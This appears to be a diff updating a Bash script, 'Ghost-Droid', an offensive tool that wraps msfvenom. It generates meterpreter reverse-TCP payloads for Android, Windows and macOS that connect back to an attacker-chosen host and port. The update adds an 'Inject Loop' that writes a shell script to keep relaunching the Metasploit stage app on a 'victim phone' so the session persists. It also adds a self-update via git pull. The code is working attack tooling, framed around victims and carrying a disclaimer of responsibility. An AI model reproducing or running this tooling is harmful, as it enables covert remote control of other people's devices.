@@ -26,7 +26,7 @@ pu='\033[1;35m'
 cy='\e[0;36m'
 lg='\e[1;32m'
 ye='\e[1;33m'
-ver=v0.1
+ver=v1.1
 
 
 function banner(){
@@ -75,11 +75,9 @@ if [[ "$?" != 0 ]]
     echo ""
     echo -e $lgf " This Script Needs An Active Internet Connection"
     echo ""
-    echo -e $ye "                Ghost-Droid Exit" 
-    echo ""
+    echo -e $ye "               Ghost-Droid Exit" 
+    echo "." | lolcat
     sleep 2
-    exip
-    echo "" | lolcat
     exit
   else
     echo -e $ye " [√] Checking For Internet:${lg} CONNECTED"
@@ -92,16 +90,16 @@ function start(){
 
 clear
 echo " " 
-echo " " 
 echo " "
 echo -e $ye "|----------------------------------------|"
 echo -e $ye "| ${re}Don't copy or try to modify the codes${ye}  |"
 echo -e	$ye "|----------------------------------------|" 
-echo -e $ye " Me or my tool is not responsible for any of your action " 
+echo -e $ye " Me or my tool is not responsible for "  
+echo "       any of your action " 
 echo " " 
-echo " " 
-figlet -f mono9 " Ghost"
-figlet -f mono9 " Droid" 
+sleep 2
+figlet -f mono9 "Ghost"
+figlet -f mono9 "Droid" 
 sleep 2
 
 }
@@ -115,11 +113,14 @@ echo ""
 echo ""                                
 echo -e $lgf " [${re}S${lgf}] Server has been Started "
 sleep 2
+echo $ye " "
 
 }
 
 function exip(){
 
+clear
+echo " "
 echo -e $cy "   +----------------------------------------+"
 echo -e $cy "   |     ${ye}Thanks for using Ghost-Droid       ${cy}|"
 echo -e $cy "   |        ${ye}See you at next time            ${cy}|"
@@ -127,7 +128,10 @@ echo -e $cy "   |----------------------------------------|"
 echo -e $cy "   |           ${lg}Bye Bye ( ^_^)/              ${cy}|"
 echo -e $cy "   +----------------------------------------+"
 echo ""
-echo "." | lolcat
+echo "        Friends keep supporting me and " | lolcat
+echo "        motivating me for making new tools " | lolcat
+echo "        FOR YOU " | lolcat
+echo " "
 sleep 1
 exit
 
@@ -177,8 +181,11 @@ echo ""
 echo " [@] This could take a while........." 
 echo " "
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport --platform android R -o /sdcard/ghost/$name.apk > /dev/null 2>&1
+echo -e $ye " "
 echo " Generated payload is saved in ghost directory "
+echo -e $re " "
 ls /sdcard/ghost | cat -n 
+echo ""
 returu
 
 }
@@ -196,9 +203,10 @@ echo ""
 echo " This could take a while........."
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > /sdcard/ghost/$name.exe > /dev/null 2>&1
 echo ""
-echo " Your payload has been saved in your sdcard in the ghost directory "
-echo ""
+echo -e $ye " Your payload has been saved in your sdcard in the ghost directory "
+echo -e $re ""
 ls /sdcard/ghost | cat -n
+echo " "
 returu
 
 }
@@ -216,9 +224,25 @@ echo ""
 echo -e $ye " This could take a while......."
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > /sdcard/ghost/$name.macho > /dev/null 2>&1 
 echo ""
-echo -e $re " Your payload has been saved in your sdcard in the ghost directory "
-echo -e $ye ""
+echo -e $ye " Your payload has been saved in your sdcard in the ghost directory "
+echo -e $re ""
 ls /sdcard/ghost | cat -n
+echo " "
+returu
+
+}
+
+function update(){
+
+clear
+figlet -f smmono12 " UPDATE" | lolcat
+echo -e $re " Updating ${lg}Ghost-Droid.......... "
+echo -e $ye " This could take few seconds......"
+cd $HOME/Ghost-Droid
+git --hard > /dev/null 2>&1
+git pull > /dev/null 2>&1
+echo " "
+echo "${blue} [ ${re}✔ ${blue}] ${ye}Ghost-Droid Updated........"
 
 }
 
@@ -228,7 +252,7 @@ echo -e $cy "   +------------[ ${ye}Ghost-Droid${cy} ]-------------+"
 echo -e $cy "   | ${pu}[${re}1${pu}] ${ye}Main-menu                          ${cy}|"
 echo -e $cy "   | ${pu}[${re}2${pu}] ${ye}Exit                               ${cy}|"
 echo -e $cy "   +----------------------------------------+"
-echo -n -e $cy "Ghost:> "
+echo -n -e $cy "Ghost:>${ye} "
 read f
 case $f in
       1) main_menu
@@ -301,6 +325,7 @@ function remove(){
 function main_menu(){
 
 clear
+figlet -f smmono9 "GHOST-DROID"
 echo -e $lgf "  __________________________________________"
 echo -e $lgf "  |${ref}========================================${lgf}|"
 echo -e $lgf "  |${ref}========[ ${ye}Ghost-Droid${ref} ]=================${lgf}|"
@@ -311,6 +336,7 @@ echo -e $lgf "  |${gf}----------------------------------------${lgf}|"
 echo -e $lgf "  | ${re}[${ye}1${re}] ${ye}Generate Payload                   ${lgf}|"
 echo -e $lgf "  | ${re}[${ye}2${re}] ${ye}Start Listener                     ${lgf}|"
 echo -e $lgf "  | ${re}[${ye}3${re}] ${ye}Inject Loop                        ${lgf}|"
+echo -e $lgf "  | ${re}[${ye}u${re}] ${ye}Update                             ${lgf}|"
 echo -e $lgf "  | ${re}[${ye}c${re}] ${ye}Clear Directory                    ${lgf}|"
 echo -e $lgf "  | ${re}[${ye}e${re}] ${ye}Exit                               ${lgf}|"
 echo -e $lgf "  |${gf}________________________________________${lgf}|"
@@ -329,7 +355,30 @@ case $cho in
         returu
      ;;
      3) echo ""
-        echo " Wait for Version 1.1"
+        if [ ! -f "/sdcard/inject/inject.sh" ]
+         then
+            printf "#!/system/bin/sh\nwhile :\ndo am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity\nsleep 20\ndone" > /sdcard/inject/inject.sh
+        fi
+        echo -e " ${ye}[${lg} + ${ye}] ${blue}A new file created inject.sh in inject"
+        echo "       folder of your sdcard "
+        sleep 2
+        echo -e $lg "  Use it if payload has been installed on "
+        echo -e $lg "  your victim phone ${ye}(${re} *${blue}_${re}*${ye})${lgf}| " 
+        sleep 2
+        echo -e $ye "Follow the steps as shown in the video tutorial"
+        echo " "
+        echo -e $blue"  This will also solve session dead problem"
+        returu
+     ;;
+     u) echo " "
+        echo -e $ye "        Ghost-Droid${re} $ver "
+        sleep 2
+        update
+        sleep 2
+        cd Ghost-Droid
+        chmod 777 setup.sh
+        ./setup.sh
+        cd 
         returu
      ;;
      c) clear
